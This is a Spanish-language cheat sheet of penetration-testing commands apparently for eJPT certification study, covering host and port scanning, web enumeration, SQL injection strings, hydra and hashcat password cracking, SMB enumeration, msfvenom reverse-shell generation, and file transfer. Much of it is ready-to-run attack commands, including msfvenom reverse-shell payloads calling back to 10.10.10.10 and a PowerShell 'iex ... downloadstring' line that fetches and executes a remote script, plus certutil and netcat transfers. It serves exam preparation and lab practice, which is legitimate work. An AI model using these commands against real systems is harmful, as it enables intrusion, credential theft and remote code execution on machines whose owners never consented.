# Cheatsheet-eJPT

- [Comandos básicos](#comandos-básicos)
- [Enumeración de OS](#enumeración-de-ossistema-operativo)
- [Puertos y servicios por defecto](#puertos-y-servicios-por-defecto)
- [Enumeración de hosts](#enumeración-de-hosts)
- [Escaneo de puertos y servicios](#escaneo-de-puertos-y-servicios)
- [Enumeración web](#enumeracion-web)
- [Fuerza bruta](#fuerza-bruta)
- [route](#route)
- [wireshark](#wireshark)
- [msfvenom](#msfvenom---generar-shellcode)
- [Archivos compartidos a nivel de red](#archivos-compartidos-a-nivel-de-red)
- [Tranferir archivos](#transferir-archivos)

# Comandos básicos

| **Comando**   | **Descripción**   |
| --------------|-------------------|
| `sudo openvpn user.ovpn` | Conectarte por VPN|
| `ifconfig`/`ip a` | Ver las direcciones ip de nuestra maquina|
| `netstat -rn` | Visualizar las disitintas conecciones via VPN  |
| `ssh user@10.10.10.10` | Conectarte por el servicio ssh  |
| `ftp 10.10.10.10 -p 22` | Conectarte al aun servidor FTP |

# Enumeración de OS(sistema operativo)

| **Comando**   |
| --------------|
|`ping -c 2 10.10.10.10`|

| **Dispositivo (OS)**   |**ttl**|
| --------------|--------------|
|(Linux/Unix)| 	64|
|Windows| 	128|
|Solaris/AIX| 	254| 

# Puertos y servicios por defecto

| **Puerto**   |**Servicio**|
| --------------|--------------|
|25|SMTP|
|22  |SSH|
|110 |  POP3
|143 |  IMAP|
|80  |HTTP|
|443 |  HTTPS|
|137 138, 139 | NETBIOS|
|115 |  SFTP|
|23  |Telnet|
|21  |FTP|
|3389|  RDP|
|3306|  MySQL|
|1433|  MS SQL Server|

# Enumeración de hosts
| **Comando**   |
| --------------|
|**fping**|
|`sudo fping -a -g 10.10.10.10/24 2>/dev/null`|
|`sudo fping -a -i 1 -r 0 < hosts.txt`|
|**nmap**|
|`nmap -sn 10.10.10.10/24`|

# Escaneo de puertos y servicios

| **Comando**   | 
| --------------|
| **nmap** |
|`nmap -p- -sS --min-rate 5000 -Pn -n 10.10.10.10`|
|`nmap -iL target_hosts.txt`|
|`nmap -F -n -vvv 10.10.10.10`|
|`nmap -n -vvv 10.10.10.10`|
|`nmap -p21,22,80 -sCV 10.10.10.10 -oN servicesScan `|
|`nmap -p21,22,80 -sC -sV 10.10.10.10 -oN servicesScan `|
|**masscan**|
|`sudo masscan -p 21,22,80,8080,445,9200 --rate 64000 --wait 0 --open-only -oG masscan.gnmap 10.10.10.10/24`|
|`sudo masscan -iL hosts.list -p0-65535 --rate 64000 --open-only`|

# Enumeracion web

| **Comando**   | 
| --------------|
| **whatweb** |
|`whatweb http://10.10.10.10:80`|
|**gobuster**|
|`gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/`|
|`gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/admin/ -U user -P passoword`|
|**dirb**|
|`dirb http://10.10.10.10/`|
|`dirb http://10.10.10.10/admin -u user:password`|
|`dirbuster vhost -r -u domain.com -w list_subdominios.txt`|
|**wfuzz**|
|`wfuzz -c -w /opt/wordlists/SecLists/Discovery/web-Content/IIS.fuzz.txt  --hc 404 -u http://10.10.10.10/FUZZ`|
|`wfuzz -c --hc 404 -t 200 -u http://domain.com/ -w /usr/share/dirb/wordlists/common.txt -H "Host: FUZZ.domain.com" `|
|**sublist3r**|
|`sublist3r -d doamin.com`|
|**Nikto**|
|`nikto -host http://10.10.10.10`|
|`nikto -host http://10.10.10.10 -port 8080`|
|**wpscan**|
|`wpscan --url http://10.10.10.10 --enumerate u`|
|`wpscan --url domain.com -e vp --plugins-detection mixed --api-token <api token>`|
|`wpscan --url domain.com -e u --passwords /usr/share/wordlists/rockyou.txt`|
|`wpscan --url domain.com -U admin -P /usr/share/wordlists/rockyou.txt`|
|**SQLinjection**|
|`OR 1=1 -- -`|
|` ORDER BY 1-- `|
|`whoami' UNION SELECT 1,2,3--`|

# Fuerza bruta

| **Comando**   | 
| --------------|
| **hydra** |
|`hydra -L users.txt -P /usr/share/wordlist/rockyou.txt ejemplo.com http /admin/`|
|`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-post "/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."`|
|`hydra -l admin  -P /usr/share/wordlists/rockyou.txt example.com http-post "/admin.php:username=admin&password=^PASS^:Incorrect username or password."`|
|`hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=<value>"`|
|**john**|
|`ssh2john id_rsa > crack.hash`|
|`zip2john prueba.zip > crack.hash`|
|`john --wordlist=/usr/share/wordlist/rockyou.txt crack.hash`|
|**hashcat**|
|`hashcat -m TYPE -a 0 crack.hash diccionario.txt`|
|`hashcat -m 1000 -a -0 crack.hash rockyou-10.txt`|


# route

| **Comando**   | 
| --------------|
| **ip route** |
|`ip route add <ip de red a llegar>/<mascara de red en CIDR> via <ip del router> dev <interfaz a usar>`|
|`ip route add 10.10.10.0/24 via 10.10.1.20 dev eth1`|

# wireshark

| **Comando**   | 
| --------------|
| **Filtro por ip** |
|`ip.add == 10.10.10.10`|
|**Filtro por el destino de ip**|
|`ip.dest==10.10.10.9`|
|**Filtro por la ip fuente**|
|`ip.src==10.10.10.8`|
|**Filtrar por un puerto**|
|`tcp.port==25`|

# msfvenom - generar shellcode
| **Comando**   | 
| --------------|
|**listar payloads**|
|`msfvenom -l payloads`|
|**Windows Reverse Shells**|
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe`|
|`msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=443 > shell.bat`|
|**Java JSP Meterpreter Reverse TCP**|
|`$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp`|
|**WAR Payload Shells**|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > shell.war`|

# Archivos compartidos a nivel de red
| **Comando**   | 
| --------------|
|**enum4linux**|
|`enum4linux -n 10.10.10.10`|
|`enum4linux 10.10.10.10`|
|**smbclient**|
|`smbclient -L WORKGROUP -I 10.10.10.10 -N -U ""`|
|`smbclient \\\\10.10.10.10\\c$ -U "user" -P "password"`|
|**smbmap**|
|`smbmap -H 10.10.10.10`|
|`smbmap -H 10.10.10.10 -u "user" -p "password"`|
|`smbmap -N -L -H 10.10.10.10`|
|**Crackmapexec**|
|`crackmapexec smb 10.10.10.10 -p 'user' -p 'user'`|
|`crackmapexec winrm 10.10.10.10 -p 'user' -p 'user'`|

# Transferir archivos

| **Comandos**   | 
| --------------|
|**Certutil**|
|`certutil -urlcache -f http://10.10.10.10/test.exe test.exe`|
|`certutil -urlcache -split -f http://10.10.10.10/test.exe test.exe`|
|**powershell**|
|`python3 -m http.server 8080`|
|`powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.10:8080/shell.ps1')")`|
|`powershell.exe wget http://10.10.10.10/test.exe -OutFile test.exe`|
|`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/test.exe', 'test.exe')`|
|**smb**|
|**Servidor**|
|`impacket-smbserver smbFolder $(pwd) -smb2support`|
|`impacket-smbserver smbFolder /root/Downloads/test -smb2support`|
|`sudo impacket-smbserver smbFolder $(pwd) -smb2support -user s3v3n -p s3v3n`|
|**Descargar**|
|`copy \\192.168.1.2\smbFolder\test.exe`|
|`net use \\10.10.10.10\smbFolder`|
|`copy \\10.10.10.10\smbFolder\test.exe /u:s3v3n s3v3n`|
|**ssh**|
|`scp /path/to/file username@a:/path/to/destination`|
|`scp username@b:/path/to/file /path/to/destination`|
|**nc**|
|`nc -lnvp 444 > fileDownload`|
|`nc.exe 10.10.10.10 444 -w 3 < fileDownload`|
|**http**|
|`python3 -m http.server 8080`|
|`wget http://10.10.10.10:8080/file`|


# Otros recursos
- [Reconocer un sistemas operativos por defecto de ttl ](https://subinsb.com/default-device-ttl-values/)
- [Uso y ejemplos de hashcat](https://miloserdov.org/?p=5426)
- [sintaxis de consultas de base de datos](https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/information-schema.html#tables-table)
- [Payloads de injeccion sql](https://github.com/payloadbox/sql-injection-payload-list)
- [Cheat Sheet de mfsvenom](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)
- [Enumeración de smb ](https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/)
- [Tansferir archivos](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)
- [ruoter ip forwarding](https://deephacking.tech/configurar-linux-para-que-actue-como-router-ip-forwarding/)